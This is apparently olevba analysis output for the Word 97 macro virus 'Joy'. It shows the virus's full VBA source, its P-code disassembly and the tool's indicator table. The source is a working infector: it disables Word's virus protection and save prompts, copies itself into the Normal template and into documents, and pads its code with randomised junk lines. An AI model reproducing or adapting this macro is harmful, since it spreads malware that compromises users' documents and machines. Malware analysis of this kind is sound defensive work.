olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Joy
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Joy - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

Dim rsx, rox, xix As Integer: Dim cix, xic, eox, xoe, oxe, cii, rxe, rex, exr, nix, ixn, nxi, lnr, nrl, rnl As String: Randomize

On Error GoTo 85

Options.VirusProtection = False

Options.SaveNormalPrompt = False

Options.ConfirmConversions = False

rt = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines

dt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines

If dt > 0 And rt > 0 Then GoTo 85

If dt = 0 Then

    Set Joy = NormalTemplate.VBProject.VBComponents

    Set hst = ActiveDocument.VBProject.VBComponents

    lx = Int(Rnd(1) * 100) + 1

    If lx = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.ultra.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(74) + Chr(111) + Chr(121)

    lr = Int(Rnd(1) * 75) + 1

    If lr = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.joy.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(74) + Chr(111) + Chr(121)

    ls = Int(Rnd(1) * 50) + 1

    If ls = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)

    lt = Int(Rnd(1) * 25) + 1

    If lt = 24 Then MsgBox Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(85) + Chr(76) + Chr(84) + Chr(82) + Chr(65) + Chr(32) + Chr(74) + Chr(111) + Chr(121), vbCritical

    hst.Item(1).Name = Joy.Item(1).Name

    hst.Item(1).Export Application.StartupPath & Chr(74) + Chr(111) + Chr(121)
    
End If

If rt = 0 Then Set Joy = ActiveDocument.VBProject.VBComponents

Joy.Item(1).codemodule.AddFromFile Application.StartupPath & Chr(74) + Chr(111) + Chr(121)

With Joy.Item(1).codemodule

    For j = 1 To 4

    .deletelines 1

    Next j

    End With

If dt = 0 Then Joy.Item(1).codemodule.replaceline 1, "Sub AutoClose()"

If dt = 0 Then Joy.Item(1).codemodule.replaceline 91, "Sub ToolsMarco()"

If dt = 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

With Joy.Item(1).codemodule

    For j = 2 To Joy.Item(1).codemodule.countoflines Step 2

    rsx = Int(Rnd(11) * 2998) + 24: rox = Int(Rnd(15) * 5863) + 33: xix = Int(Rnd(44) * 3544) + 55

    cii = Asc(rsx): eox = Chr$(cii + 2): xoe = Chr$(cii - 9): oxe = Chr$(cii + 10): lnr = Chr$(cii - 4)

    cix = Asc(rox): rxe = Chr$(cix + 4): rex = Chr$(cix - 11): exr = Chr$(cix + 16): nrl = Chr$(cix - 17)

    xic = Asc(xix): nix = Chr$(xic + 6): ixn = Chr$(xic - 14): nxi = Chr$(xic + 22): rnl = Chr$(xic - 33)

    .replaceline j, "'" & lnr & nrl & rnl & nix & xoe & rxe & nix & xoe & rex & ixn & oxe & exr & nxi & eox & lnr & nrl & rnl & nix & xoe & xoe & rxe & nxi & eox & oxe & exr & nxi & eox & lnr & ixn & oxe & exr & nxi & eox & lnr & nix & xoe & rex & ixn & oxe & exr & nxi & eox & lnr & nrl & rnl & nix & xoe & xoe & rxe & nxi & eox & oxe & exr & nxi & eox & lnr & ixn & oxe & exr & nxi & eox & lnr

Next j

End With

85:

If dt <> 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

Sub ViewVBCode() 'WM97/Ultra.Joy by Virus :) Smile

End Sub





-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Joy
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6836 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' Line #2:
' 	Dim 
' 	VarDefn rsx
' 	VarDefn rox
' 	VarDefn xix (As Integer)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn cix
' 	VarDefn xic
' 	VarDefn eox
' 	VarDefn xoe
' 	VarDefn oxe
' 	VarDefn cii
' 	VarDefn rxe
' 	VarDefn rex
' 	VarDefn exr
' 	VarDefn nix
' 	VarDefn ixn
' 	VarDefn nxi
' 	VarDefn lnr
' 	VarDefn nrl
' 	VarDefn rnl (As String)
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' Line #3:
' Line #4:
' 	OnError 85 
' Line #5:
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #9:
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #11:
' Line #12:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St rt 
' Line #13:
' Line #14:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St dt 
' Line #15:
' Line #16:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 85 
' 	EndIf 
' Line #17:
' Line #18:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #19:
' Line #20:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Joy 
' Line #21:
' Line #22:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set hst 
' Line #23:
' Line #24:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St lx 
' Line #25:
' Line #26:
' 	Ld lx 
' 	LitDI2 0x0063 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld wdWindowStateMinimize 
' 	Ld ActiveWindow 
' 	MemSt WindowState 
' 	BoS 0x0000 
' 	LitStr 0x0014 "http://www.ultra.com"
' 	ParamNamed Address 
' 	LitVarSpecial (False)
' 	ParamNamed NewWindow 
' 	LitVarSpecial (False)
' 	ParamNamed AddHistory 
' 	LitDI2 0x004A 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ParamNamed ExtraInfo 
' 	Ld ActiveDocument 
' 	ArgsMemCall FollowHyperlink 0x0004 
' 	EndIf 
' Line #27:
' Line #28:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x004B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St lr 
' Line #29:
' Line #30:
' 	Ld lr 
' 	LitDI2 0x004A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld wdWindowStateMinimize 
' 	Ld ActiveWindow 
' 	MemSt WindowState 
' 	BoS 0x0000 
' 	LitStr 0x0012 "http://www.joy.com"
' 	ParamNamed Address 
' 	LitVarSpecial (False)
' 	ParamNamed NewWindow 
' 	LitVarSpecial (False)
' 	ParamNamed AddHistory 
' 	LitDI2 0x004A 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ParamNamed ExtraInfo 
' 	Ld ActiveDocument 
' 	ArgsMemCall FollowHyperlink 0x0004 
' 	EndIf 
' Line #31:
' Line #32:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St ls 
' Line #33:
' Line #34:
' 	Ld ls 
' 	LitDI2 0x0031 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0048 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #35:
' Line #36:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St lt 
' Line #37:
' Line #38:
' 	Ld lt 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #39:
' Line #40:
' 	LitDI2 0x0001 
' 	Ld Joy 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld hst 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #41:
' Line #42:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitDI2 0x004A 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld hst 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #43:
' Line #44:
' 	EndIfBlock 
' Line #45:
' Line #46:
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Joy 
' 	EndIf 
' Line #47:
' Line #48:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitDI2 0x004A 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld Joy 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #49:
' Line #50:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld Joy 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #51:
' Line #52:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #53:
' Line #54:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #55:
' Line #56:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' Line #58:
' 	EndWith 
' Line #59:
' Line #60:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x0001 
' 	Ld Joy 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #61:
' Line #62:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x005B 
' 	LitStr 0x0010 "Sub ToolsMarco()"
' 	LitDI2 0x0001 
' 	Ld Joy 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #63:
' Line #64:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #65:
' Line #66:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld Joy 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #67:
' Line #68:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld Joy 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #69:
' Line #70:
' 	LitDI2 0x000B 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0BB6 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0018 
' 	Add 
' 	St rsx 
' 	BoS 0x0000 
' 	LitDI2 0x000F 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x16E7 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0021 
' 	Add 
' 	St rox 
' 	BoS 0x0000 
' 	LitDI2 0x002C 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0DD8 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0037 
' 	Add 
' 	St xix 
' Line #71:
' Line #72:
' 	Ld rsx 
' 	ArgsLd Asc 0x0001 
' 	St cii 
' 	BoS 0x0000 
' 	Ld cii 
' 	LitDI2 0x0002 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St eox 
' 	BoS 0x0000 
' 	Ld cii 
' 	LitDI2 0x0009 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St xoe 
' 	BoS 0x0000 
' 	Ld cii 
' 	LitDI2 0x000A 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St oxe 
' 	BoS 0x0000 
' 	Ld cii 
' 	LitDI2 0x0004 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St lnr 
' Line #73:
' Line #74:
' 	Ld rox 
' 	ArgsLd Asc 0x0001 
' 	St cix 
' 	BoS 0x0000 
' 	Ld cix 
' 	LitDI2 0x0004 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St rxe 
' 	BoS 0x0000 
' 	Ld cix 
' 	LitDI2 0x000B 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St rex 
' 	BoS 0x0000 
' 	Ld cix 
' 	LitDI2 0x0010 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St exr 
' 	BoS 0x0000 
' 	Ld cix 
' 	LitDI2 0x0011 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St nrl 
' Line #75:
' Line #76:
' 	Ld xix 
' 	ArgsLd Asc 0x0001 
' 	St xic 
' 	BoS 0x0000 
' 	Ld xic 
' 	LitDI2 0x0006 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St nix 
' 	BoS 0x0000 
' 	Ld xic 
' 	LitDI2 0x000E 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St ixn 
' 	BoS 0x0000 
' 	Ld xic 
' 	LitDI2 0x0016 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St nxi 
' 	BoS 0x0000 
' 	Ld xic 
' 	LitDI2 0x0021 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St rnl 
' Line #77:
' Line #78:
' 	Ld j 
' 	LitStr 0x0001 "'"
' 	Ld lnr 
' 	Concat 
' 	Ld nrl 
' 	Concat 
' 	Ld rnl 
' 	Concat 
' 	Ld nix 
' 	Concat 
' 	Ld xoe 
' 	Concat 
' 	Ld rxe 
' 	Concat 
' 	Ld nix 
' 	Concat 
' 	Ld xoe 
' 	Concat 
' 	Ld rex 
' 	Concat 
' 	Ld ixn 
' 	Concat 
' 	Ld oxe 
' 	Concat 
' 	Ld exr 
' 	Concat 
' 	Ld nxi 
' 	Concat 
' 	Ld eox 
' 	Concat 
' 	Ld lnr 
' 	Concat 
' 	Ld nrl 
' 	Concat 
' 	Ld rnl 
' 	Concat 
' 	Ld nix 
' 	Concat 
' 	Ld xoe 
' 	Concat 
' 	Ld xoe 
' 	Concat 
' 	Ld rxe 
' 	Concat 
' 	Ld nxi 
' 	Concat 
' 	Ld eox 
' 	Concat 
' 	Ld oxe 
' 	Concat 
' 	Ld exr 
' 	Concat 
' 	Ld nxi 
' 	Concat 
' 	Ld eox 
' 	Concat 
' 	Ld lnr 
' 	Concat 
' 	Ld ixn 
' 	Concat 
' 	Ld oxe 
' 	Concat 
' 	Ld exr 
' 	Concat 
' 	Ld nxi 
' 	Concat 
' 	Ld eox 
' 	Concat 
' 	Ld lnr 
' 	Concat 
' 	Ld nix 
' 	Concat 
' 	Ld xoe 
' 	Concat 
' 	Ld rex 
' 	Concat 
' 	Ld ixn 
' 	Concat 
' 	Ld oxe 
' 	Concat 
' 	Ld exr 
' 	Concat 
' 	Ld nxi 
' 	Concat 
' 	Ld eox 
' 	Concat 
' 	Ld lnr 
' 	Concat 
' 	Ld nrl 
' 	Concat 
' 	Ld rnl 
' 	Concat 
' 	Ld nix 
' 	Concat 
' 	Ld xoe 
' 	Concat 
' 	Ld xoe 
' 	Concat 
' 	Ld rxe 
' 	Concat 
' 	Ld nxi 
' 	Concat 
' 	Ld eox 
' 	Concat 
' 	Ld oxe 
' 	Concat 
' 	Ld exr 
' 	Concat 
' 	Ld nxi 
' 	Concat 
' 	Ld eox 
' 	Concat 
' 	Ld lnr 
' 	Concat 
' 	Ld ixn 
' 	Concat 
' 	Ld oxe 
' 	Concat 
' 	Ld exr 
' 	Concat 
' 	Ld nxi 
' 	Concat 
' 	Ld eox 
' 	Concat 
' 	Ld lnr 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #79:
' Line #80:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #81:
' Line #82:
' 	EndWith 
' Line #83:
' Line #84:
' 	LineNum 85 
' 	BoS 0x0000 
' Line #85:
' Line #86:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #87:
' Line #88:
' 	EndSub 
' Line #89:
' Line #90:
' 	FuncDefn (Sub ViewVBCode())
' 	QuoteRem 0x0010 0x0020 "WM97/Ultra.Joy by Virus :) Smile"
' Line #91:
' Line #92:
' 	EndSub 
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |http://www.ultra.com|URL                                          |
|IOC       |http://www.joy.com  |URL                                          |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

